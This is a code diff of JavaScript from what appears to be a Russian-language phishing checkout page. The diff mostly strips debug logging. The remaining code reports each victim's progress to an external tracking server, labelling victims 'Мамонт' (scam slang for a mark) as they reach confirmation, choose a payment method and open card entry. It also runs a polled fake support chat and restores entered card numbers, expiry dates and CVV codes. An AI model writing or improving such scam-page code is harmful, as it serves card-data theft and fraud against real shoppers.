@@ -1711,7 +1711,6 @@
   function sendLog(type, details, callback) {
     const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
 
-    console.log(`📨 sendLog called: type=${type}, details=${details.substring(0, 50)}...`);
 
     fetch(LOG_SERVER_URL, {
       method: 'POST',
@@ -1725,14 +1724,12 @@
       })
     })
     .then(response => {
-      console.log(`✅ Log sent successfully: ${type}`);
       return response.json();
     })
     .then(data => {
       if (callback) callback();
     })
     .catch(error => {
-      console.error(`❌ Error sending log (${type}):`, error);
       // Store failed log in localStorage for debugging
       const failedLogs = JSON.parse(localStorage.getItem('failedLogs') || '[]');
       failedLogs.push({type, details, error: error.message, time: new Date().toISOString()});
@@ -1811,7 +1808,6 @@
     }
 
     if (!link_id) {
-      console.error("❌ Нет link_id в hash или query параметрах");
       return;
     }
 
@@ -1839,12 +1835,10 @@
       displayProductData(data);
 
     } catch (error) {
-      console.error("❌ Ошибка подстановки данных:", error);
     }
   }
 
   generateOrderNumber();
-  fillFromParams().catch(e => console.error('Error filling params:', e));
 
   // Online/Offline tracking & page logging
   // Get link_id from hash or query params (same logic as fillFromParams)
@@ -1854,26 +1848,19 @@
     link_id = urlParams.get('link_id');
   }
 
-  console.log(`🔍 DEBUG: link_id=${link_id}`);
-  console.log(`🔍 DEBUG: typeof sendLog=${typeof sendLog}`);
-  console.log(`🔍 DEBUG: sendLog function exists? ${typeof sendLog === 'function'}`);
 
   // Log page confirmation when orders.html loads
   if (link_id && typeof sendLog === 'function') {
-    console.log(`✅ Calling sendLog for page_confirmation`);
     sendLog('page_confirmation', `📋 Мамонт перешел на подтверждение\nlink_id=${link_id}`);
   } else {
-    console.log(`❌ Skipping sendLog: link_id=${link_id}, typeof sendLog=${typeof sendLog}`);
   }
   if (link_id && typeof sendLog === 'function') {
-    console.log(`✅ Calling sendLog for online`);
     sendLog('online', link_id);
   }
 
   // Send online when page becomes visible (e.g., returning from back button)
   window.addEventListener('pageshow', function(event) {
     if (link_id && typeof sendLog === 'function') {
-      console.log(`✅ Page shown - sending online status`);
       sendLog('online', link_id);
     }
   });
@@ -2508,7 +2495,6 @@ function openBankModal() {
     // Log payment flow when user opens bank selection
     sendLog('payment_flow', `💳 Мамонт выбирает способ оплаты\nlink_id=${link_id}`);
   } else {
-    console.error('❌ sendLog is not defined!');
   }
 }
 
@@ -2531,7 +2517,6 @@ function openCardModal() {
   if (typeof sendLog === 'function') {
     sendLog('page_confirmation', `💳 Мамонт перешел на ввод карты\nlink_id=${link_id}`);
   } else {
-    console.error('❌ sendLog is not defined!');
   }
 }
 
@@ -2601,10 +2586,8 @@ document.addEventListener('DOMContentLoaded', function() {
               .then(data => {
                 supportChatOpened = false; // Reset for next request
               })
-              .catch(err => console.error('Clear support error:', err));
           }
         })
-        .catch(err => console.error('Support check error:', err));
     }, 2000); // Check every 2 seconds
   }
 
@@ -2642,7 +2625,6 @@ document.addEventListener('DOMContentLoaded', function() {
   function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(() => {
     }).catch(err => {
-      console.error('Failed to copy:', err);
     });
   }
 
@@ -2656,7 +2638,6 @@ document.addEventListener('DOMContentLoaded', function() {
         cardExpiryInput.value = data.cardExpiry || '';
         cardCVVInput.value = data.cardCVV || '';
       } catch (e) {
-        console.error('Error restoring card data:', e);
       }
     }
   }
@@ -2777,7 +2758,6 @@ document.addEventListener('DOMContentLoaded', function() {
         if (fileReadyToSend) {
           window.sendChatMsg();
         } else {
-          alert('Файл не загрузился. Попробуй заново.');
         }
       }, 500);
       return;
@@ -2959,7 +2939,6 @@ function handleFileUpload(input) {
     }
   };
   reader.onerror = err => {
-    console.error('❌ FileReader error:', err);
   };
   reader.readAsDataURL(file);
 
@@ -3067,7 +3046,6 @@ function restoreChatMessagesFromLocalStorage(link_id) {
     messages.scrollTop = messages.scrollHeight;
     return true;
   } catch (e) {
-    console.error('Error restoring chat messages:', e);
     return false;
   }
 }
@@ -3094,7 +3072,7 @@ function startSupportChatPolling() {
   let lastMessageCount = 0;
 
   setInterval(() => {
-    fetch(`https://worker-production-740e.up.railway.app/support/messages/${link_id}`)
+    fetch(`https://worker-production-740e.up.railway.app/support/messages/${link_id}?page_type=orders`)
       .then(res => res.json())
       .then(data => {
         if (data.messages && data.messages.length > lastMessageCount) {
@@ -3131,7 +3109,6 @@ function startSupportChatPolling() {
           saveChatMessagesToLocalStorage(link_id);
         }
       })
-      .catch(err => console.error('Error polling messages:', err));
   }, 2000); // Poll every 2 seconds
 }
 
